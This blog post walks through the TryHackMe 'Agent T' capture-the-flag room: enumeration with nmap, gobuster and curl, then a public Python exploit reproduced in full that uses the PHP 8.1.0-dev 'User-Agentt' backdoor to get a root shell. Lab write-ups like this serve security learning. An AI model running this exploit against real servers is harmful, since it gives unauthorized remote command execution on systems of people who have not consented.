---
title: "Challenges: Agent T (TryHackMe)"
datePublished: Fri Aug 08 2025 21:00:00 GMT+0000 (Coordinated Universal Time)
cuid: cme7wzttm000d02l4a7nw1za2
slug: challenges-agent-t-tryhackme
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1754965144254/6f924696-0128-4e4f-a8c1-f7a6ac9a6ab8.png
tags: http, python, exploit, tryhackme, websecurity, ctf-writeup

---

During this investigation, Agent T identified a seemingly harmless website, but its server behavior suggested something unusual. Upon enumeration, the HTTP response headers revealed the site was running **PHP 8.1.0-dev**, a development version known to have contained a backdoor in its early release. This immediately raised suspicion of a potential remote code execution (RCE) vulnerability, prompting further testing and exploitation attempts.  

![](https://tryhackme-images.s3.amazonaws.com/room-icons/5dbc4e7d8515e7bc05b7742f26944ae9.png align="left")

Agent T uncovered this website, which looks innocent enough, but something seems off about how the server responds...

After deploying the vulnerable machine attached to this task, please wait a couple of minutes for it to respond.

### Answer the questions below

What is the flag?

`nmap -sV IP_Address`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1754964783870/e5f4897d-8754-49b5-9e72-f8007dc6e3e6.png align="center")

`gobuster dir -u IP_Address -w /usr/share/wordlists/dirb/common.txt`

  
gobuster didn’t reveal anything much  

`curl -I http://IP_Address/`

```bash
HTTP/1.1 200 OK
Host: 10.10.107.58
Date: Mon, 11 Aug 2025 08:07:42 GMT
Connection: close
X-Powered-By: PHP/8.1.0-dev
Content-type: text/html; charset=UTF-8
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1754964904722/f5a731e0-f76f-473c-94d5-8c407093a6f6.png align="center")

search: X-Powered-By: PHP/8.1.0-dev exploit-db reveals **PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution**  

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1754964960158/6c6400ba-78d8-43ef-8734-a456400a04cd.png align="center")

  

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1754964987798/e39c1380-101b-43be-80cc-e5e2dd91d23b.png align="center")

`nano script.py`

```bash
# Exploit Title: PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution
# Date: 23 may 2021
# Exploit Author: flast101
# Vendor Homepage: <https://www.php.net/>
# Software Link: 
#     - <https://hub.docker.com/r/phpdaily/php>
#    - <https://github.com/phpdaily/php>
# Version: 8.1.0-dev
# Tested on: Ubuntu 20.04
# References:
#    - <https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a>
#   - <https://github.com/vulhub/vulhub/blob/master/php/8.1-backdoor/README.zh-cn.md>

"""
Blog: <https://flast101.github.io/php-8.1.0-dev-backdoor-rce/>
Download: <https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/backdoor_php_8.1.0-dev.py>
Contact: flast101.sec@gmail.com

An early release of PHP, the PHP 8.1.0-dev version was released with a backdoor on March 28th 2021, but the backdoor was quickly discovered and removed. If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the User-Agentt header.
The following exploit uses the backdoor to provide a pseudo shell ont the host.
"""

#!/usr/bin/env python3
import os
import re
import requests

host = input("Enter the full host url:\\n")
request = requests.Session()
response = request.get(host)

if str(response) == '<Response [200]>':
    print("\\nInteractive shell is opened on", host, "\\nCan't acces tty; job crontol turned off.")
    try:
        while 1:
            cmd = input("$ ")
            headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "User-Agentt": "zerodiumsystem('" + cmd + "');"
            }
            response = request.get(host, headers = headers, allow_redirects = False)
            current_page = response.text
            stdout = current_page.split('<!DOCTYPE html>',1)
            text = print(stdout[0])
    except KeyboardInterrupt:
        print("Exiting...")
        exit

else:
    print("\\r")
    print(response)
    print("Host is not available, aborting...")
    exit
            
```

`python3 script.py`

we get the root user and the flag.txt file

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1754965024343/d987642c-ab77-41fb-a7c1-b445ff23a9f0.png align="center")

By leveraging the publicly documented PHP 8.1.0-dev *User-Agentt* header backdoor, I successfully executed arbitrary commands on the target system. This provided direct remote shell access as the root user, allowing retrieval of the `flag.txt` file. The exercise highlights the severe risks of deploying unpatched or development-stage software in production environments, as even a single overlooked backdoor can result in full system compromise.